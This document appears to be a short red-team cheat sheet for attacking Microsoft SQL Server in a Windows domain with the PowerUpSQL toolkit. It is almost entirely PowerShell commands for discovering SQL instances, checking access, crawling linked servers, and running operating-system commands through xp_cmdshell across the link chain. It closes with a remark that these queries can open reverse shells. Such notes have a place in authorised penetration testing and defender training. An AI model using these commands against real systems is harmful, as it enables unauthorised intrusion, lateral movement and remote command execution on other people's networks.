## MS SQL 

```powershell
# Import PowerUpSQL.psd1
C:> Import-Module C:\AD\Tools\PowerUpSQL-master \PowerupSQL.psd1
```
### Enumerate
---
#### Discovery (SPN Scan)
```powershell
C:> Get-SQLInstanceDomain
```
#### Gather Information
```powershell
C:> Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```
#### Check Accessibility
```powershell
C:> Get-SQLConnectionTestThreaded
C:> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```
### Database Links
---
#### Look for Links to Remote Servers
```powershell
C:> Get-SQLServerLink -Instance <mssql_instance> -Verbose
# Also can do the query "select * from master..sysservers"
```
#### Enumerate Database Links
```powershell
C:> Get-SQLServerLinkCrawl -Instance <mssql_instance> -Verbose
```
### Execute Commands
---
```powershell
# On Specific Instance
C:> Get-SQLServerLinkCrawl -Instance <mssql_instance> Query "exec master..xp_cmdshell 'whoami'" -QueryTarget <sq_host>

# Execute query on every link of the chain
C:> Get-SQLServerLinkCrawl -Instance <mssql_instance> Query "exec master..xp_cmdshell 'whoami'" 

# Use this queries to open reverse shells
```
